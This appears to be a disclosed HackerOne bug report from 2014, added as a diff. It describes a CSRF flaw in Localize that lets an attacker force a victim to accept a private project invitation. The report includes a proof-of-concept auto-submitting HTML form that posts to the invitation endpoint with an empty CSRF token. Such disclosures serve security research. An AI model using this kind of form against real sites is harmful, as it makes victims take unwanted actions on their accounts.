@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/8224
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/ajaysinghnegi
+ReportedTo:Localize(localize)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:21.04.2014 2:48:19
+
+Summary:
+
+Hi Team,
+
+I have found a CSRF vulnerability using which the attacker can force the victim to Accpeted the private project access invitation request Via CSRF as the anti-csrf token is not getting validated on the server-side. 
+
+
+Private Project Access Request Accpeted Via CSRF Code:
+
+<html>
+<html>
+  <body>
+    <form action="http://www.localize.io/invitations/9l" method="POST">
+      <input type="hidden" name="CSRFToken" value="" />
+      <input type="hidden" name="invitations[userID]" value="3gh" />
+      <input type="hidden" name="invitations[accept]" value="-1" />
+      <input type="hidden" name="invitations[role]" value="4" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
